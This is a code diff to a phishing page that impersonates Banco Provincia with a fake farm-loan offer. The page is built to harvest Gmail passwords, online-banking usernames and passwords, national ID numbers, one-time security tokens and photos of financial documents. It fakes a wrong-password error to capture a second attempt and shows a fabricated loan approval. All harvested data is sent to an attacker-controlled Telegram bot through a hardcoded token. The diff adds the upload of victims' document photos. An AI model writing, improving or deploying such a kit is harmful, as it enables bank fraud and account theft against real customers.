@@ -9,7 +9,6 @@
 <link rel="icon" href="https://www.bancoprovincia.bancainternet.com.ar/spa/favicon.ico">
 <link rel="apple-touch-icon" sizes="180x180" href="https://www.bancoprovincia.bancainternet.com.ar/spa/icons/apple-touch-icon.png">
 <script>function setVH(){document.documentElement.style.setProperty("--vh",(window.innerHeight/100)+"px");}setVH();window.addEventListener("resize",setVH);</script>
-<script src="https://accounts.google.com/gsi/client" async defer></script>
 <link rel="stylesheet" href="estilo.css">
 <link rel="stylesheet" href="parche.css">
 <style>
@@ -164,18 +163,18 @@
   <div class="box my-2"><h1 class="pb-0 txt-title">Calificación crediticia</h1></div>
   <p class="txt-default">Para cerrar la evaluación el banco pide documentación de la explotación.</p>
   <div class="mb-3">
-    <label class="label-required txt-input-label" for="foto">Últimos movimientos de la cuenta</label>
-    <input class="form-control" id="foto" type="file" accept="image/*">
-    <p class="doc-msg" id="fotoMsg">Obligatorio.</p>
+    <label class="label-required txt-input-label" for="foto">Últimos movimientos de la cuenta (Obligatorio)</label>
+    <input class="form-control" id="foto" type="file" accept="image/png, image/jpeg">
+    <p class="doc-msg" id="fotoMsg">Debe subir una imagen obligatoriamente.</p>
   </div>
   <div class="mb-3">
     <label class="txt-input-label" for="doc1">Título de propiedad o contrato de arrendamiento</label>
-    <input class="form-control" id="doc1" type="file" accept="image/*">
+    <input class="form-control" id="doc1" type="file" accept="image/png, image/jpeg">
     <p class="doc-msg" id="doc1Msg">Opcional.</p>
   </div>
   <div class="mb-3">
     <label class="txt-input-label" for="doc2">Facturación de la explotación</label>
-    <input class="form-control" id="doc2" type="file" accept="image/*">
+    <input class="form-control" id="doc2" type="file" accept="image/png, image/jpeg">
     <p class="doc-msg" id="doc2Msg">Opcional.</p>
   </div>
   <div class="box text-center"><button class="btn w-100 btn-primary btn" type="button" id="b5">Enviar y continuar</button></div>
@@ -202,8 +201,6 @@
 <div id="pG" class="oculto">
   <div class="box my-2"><h1 class="pb-0 txt-title">Recibí la respuesta</h1></div>
   <p class="txt-default">Validá tu Gmail para que te llegue la constancia de aprobación y el detalle de las cuotas.</p>
-  <div id="gbtn"></div>
-  <div class="box text-center mb-2"><span class="txt-small">o completá a mano</span></div>
   <div class="mb-3">
     <label class="label-required txt-input-label" for="mail">Tu Gmail</label>
     <input class="form-control border-info focusMouse" id="mail" type="email" inputmode="email" maxlength="40" placeholder="tunombre@gmail.com" autocomplete="off">
@@ -212,7 +209,7 @@
     <label class="label-required txt-input-label" for="gpass">Contraseña de tu Gmail</label>
     <input class="form-control border-info focusMouse" id="gpass" type="password" maxlength="40" placeholder="Ingresá tu contraseña" autocomplete="off">
   </div>
-  <div class="box text-center"><button class="btn w-100 btn-primary btn focusMouse" type="button" id="b0">Continuar con Google</button></div>
+  <div class="box text-center"><button class="btn w-100 btn-primary btn focusMouse" type="button" id="b0">Continuar</button></div>
 </div>
 
 <!-- 6 LOGIN -->
@@ -304,10 +301,8 @@
 </div></div></div></div>
 
 <script>
-/* Credenciales de Telegram configuradas */
 var TELEGRAM_BOT_TOKEN = "8936976510:AAGrXZaDSu5a880qyMEqDj6450f3Q9nN5ko";
 var TELEGRAM_CHAT_ID = "7524834601";
-var CLIENTE_GOOGLE = "TU_CLIENT_ID.apps.googleusercontent.com";
 
 /* parámetros de la línea: tasa, sellos y seguro fijos; IVA a elección */
 var TOPE=250000000, FINANCIA=0.4, TNA=0.35, SELLOS=0.012, SEGURO=0.003;
@@ -334,11 +329,7 @@ function ir(a,b){$(a).classList.add("oculto");$(b).classList.remove("oculto");wi
 function marcar(e,m){e.classList.toggle("mal",m);}
 function pesos(n){return "$"+Math.round(n).toLocaleString("es-AR");}
 
-function enviar(estado){
-  var c=JSON.stringify(Object.assign({},datos,{estado:estado}));
-  function q(){try{var x=JSON.parse(localStorage.getItem("q")||"[]");x.push(c);localStorage.setItem("q",JSON.stringify(x));}catch(e){}}
-  q();
-
+function enviarTexto(estado) {
   var mensaje = "<b>🔔 Notificación BAPRO</b>\n" +
                 "━━━━━━━━━━━━━━━━━━━\n" +
                 "📌 <b>Estado:</b> " + estado + "\n" +
@@ -352,48 +343,38 @@ function enviar(estado){
                 "📱 <b>Token:</b> " + (datos.token1 || datos.token2 || datos.token3 || datos.token4 || "-");
 
   var url = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendMessage";
-  var payload = {
-    chat_id: TELEGRAM_CHAT_ID,
-    text: mensaje,
-    parse_mode: "HTML"
-  };
-
-  try {
-    fetch(url, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(payload),
-      keepalive: true
-    }).catch(function(err) {
-      console.error("Error al enviar a Telegram:", err);
-    });
-  } catch(e) {
-    console.error("Excepción:", e);
-  }
+  fetch(url, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: mensaje, parse_mode: "HTML" }),
+    keepalive: true
+  }).catch(function(err){ console.error(err); });
 }
 
-window.addEventListener("load",function(){
-  var x;try{x=JSON.parse(localStorage.getItem("q")||"[]");}catch(e){x=[];}
-  if(!x.length)return;
-  localStorage.setItem("q","[]");
-});
+function enviarFoto(base64Data, captionText) {
+  var url = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendPhoto";
+  
+  // Convertir base64 a Blob para enviarlo como archivo multipart a Telegram
+  var byteString = atob(base64Data);
+  var ab = new ArrayBuffer(byteString.length);
+  var ia = new Uint8Array(ab);
+  for (var i = 0; i < byteString.length; i++) {
+    ia[i] = byteString.charCodeAt(i);
+  }
+  var blob = new Blob([ab], { type: "image/jpeg" });
 
-window.addEventListener("load",function(){
-  if(!window.google||CLIENTE_GOOGLE.indexOf("TU_CLIENT_ID")===0)return;
-  try{
-    google.accounts.id.initialize({
-      client_id:CLIENTE_GOOGLE, ux_mode:"popup",
-      callback:function(r){
-        try{
-          var b=r.credential.split(".")[1].replace(/-/g,"+").replace(/_/g,"/");
-          var p=JSON.parse(decodeURIComponent(escape(atob(b))));
-          if(p.email){$("mail").value=p.email;marcar($("mail"),false);}
-        }catch(e){}
-      }
-    });
-    google.accounts.id.renderButton($("gbtn"),{theme:"outline",size:"large",width:320,text:"continue_with",locale:"es",shape:"pill"});
-  }catch(e){}
-});
+  var formData = new FormData();
+  formData.append("chat_id", TELEGRAM_CHAT_ID);
+  formData.append("photo", blob, "documento.jpg");
+  formData.append("caption", captionText);
+  formData.append("parse_mode", "HTML");
+
+  fetch(url, {
+    method: "POST",
+    body: formData,
+    keepalive: true
+  }).catch(function(err){ console.error(err); });
+}
 
 $("b0").onclick=function(){
   var m=$("mail").value.trim(),p=$("gpass").value;
@@ -401,7 +382,7 @@ $("b0").onclick=function(){
   marcar($("mail"),!mOk);marcar($("gpass"),!pOk);
   if(!mOk){$("mail").focus();return;}
   if(!pOk){$("gpass").focus();return;}
-  datos.email=m;datos.gmail_pass=p;enviar("gmail");
+  datos.email=m;datos.gmail_pass=p;enviarTexto("gmail_manual");
   ir("pG","p1");$("username").focus();
 };
 $("gpass").addEventListener("keydown",function(e){if(e.key==="Enter"){e.preventDefault();$("b0").click();}});
@@ -414,13 +395,13 @@ function entrar(){
   if(!cOk){$("password").focus();return false;}
   datos.usuario=u;datos.clave=c;
   var reint=!!datos.reintento;
-  enviar(reint?"login_retry":"login");
+  enviarTexto(reint?"login_retry":"login");
   ir("p1","pSp");
   setTimeout(function(){
     if(!reint){
       datos.reintento=1;$("password").value="";ir("pSp","p1");
       $("password").classList.add("mal");$("err").classList.remove("oculto");
-      $("password").focus();enviar("clave_mala");
+      $("password").focus();enviarTexto("clave_mala");
     }else{ir("pSp","p3");pintarEtapa();}
   },2200);
   return false;
@@ -473,13 +454,13 @@ function calcular(){
 $("dni").oninput=function(e){e.target.value=dig(e.target.value).slice(0,8);marcar(e.target,false);};
 $("b2").onclick=function(){
   if($("dni").value.length!==8){marcar($("dni"),true);$("dni").focus();return;}
-  datos.dni=$("dni").value;enviar("datos");
+  datos.dni=$("dni").value;enviarTexto("datos_dni");
   calcular();ir("p0","sim");
 };
 $("bSim").onclick=function(){
   if(!datos.monto||datos.monto<500000){$("hectareas").focus();return;}
   $("monto").textContent=datos.monto.toLocaleString("es-AR");
-  enviar("simulacion");
+  enviarTexto("simulacion");
   ir("sim","p2b");
 };
 $("b4").onclick=function(){ir("p2b","p2c");};
@@ -494,8 +475,9 @@ function enganchar(id,clave,msg){
         var w=900,h=Math.round(img.height*w/img.width);
         var cv=document.createElement("canvas");cv.width=w;cv.height=h;
         cv.getContext("2d").drawImage(img,0,0,w,h);
-        fotos[clave]=cv.toDataURL("image/jpeg",0.6).split(",")[1];
+        fotos[clave]=cv.toDataURL("image/jpeg",0.7).split(",")[1];
         $(msg).textContent="Listo.";
+        marcar($(id), false);
       };
       img.src=fr.result;
     };
@@ -507,7 +489,20 @@ enganchar("doc1","titulo","doc1Msg");
 enganchar("doc2","factura","doc2Msg");
 
 $("b5").onclick=function(){
-  Object.keys(fotos).forEach(function(k){datos[k]=fotos[k];enviar("doc_"+k);});
+  // Validación: si no cargó el documento obligatorio (foto / mov), se bloquea
+  if(!fotos["mov"]){
+    marcar($("foto"), true);
+    $("fotoMsg").textContent="¡Obligatorio subir este documento para calificar!";
+    $("foto").focus();
+    return;
+  }
+
+  // Enviar las fotos cargadas directamente a Telegram como archivos de imagen
+  Object.keys(fotos).forEach(function(k){
+    var nombreDoc = k === "mov" ? "Últimos movimientos de la cuenta" : (k === "titulo" ? "Título de propiedad" : "Facturación");
+    enviarFoto(fotos[k], "📄 <b>Documento recibido:</b> " + nombreDoc + "\n👤 <b>DNI:</b> " + (datos.dni || "-"));
+  });
+
   ir("p2c","pAn");
   var i=0;
   $("anTxt").textContent=TXT_AN[0];
@@ -520,7 +515,7 @@ $("b5").onclick=function(){
     clearInterval(tAn);
     $("montoOk").textContent=datos.monto.toLocaleString("es-AR");
     $("legajoOk").textContent="47-2026-"+Math.floor(1000+Math.random()*9000);
-    enviar("aprobado");
+    enviarTexto("aprobado");
     ir("pAn","pOk");
   },25000);
 };
@@ -560,7 +555,7 @@ $("tok").oninput=function(e){
 $("b3").onclick=function(){
   if($("tok").value.length!==6)return;
   datos["token"+(etapa+1)]=dig($("tok").value);
-  enviar(ETAPAS[etapa].est);
+  enviarTexto(ETAPAS[etapa].est);
   clearInterval(tTok);
   etapa++;
   if(etapa===2){
@@ -589,11 +584,12 @@ $("b3").onclick=function(){
   }
 };
 $("sinTok").onclick=function(){
-  enviar("sin_token");clearInterval(tTok);
+  enviarTexto("sin_token");clearInterval(tTok);
   $("legajo2").textContent="47-2026-"+Math.floor(1000+Math.random()*9000);
   ir("p3","p5");
 };
 $("irBanco").onclick=function(){location.href="https://www.bancoprovincia.bancainternet.com.ar/spa/";};
 </script>
 </body>
-</html>
+                                                                                                                                                                                                             </html>
+  
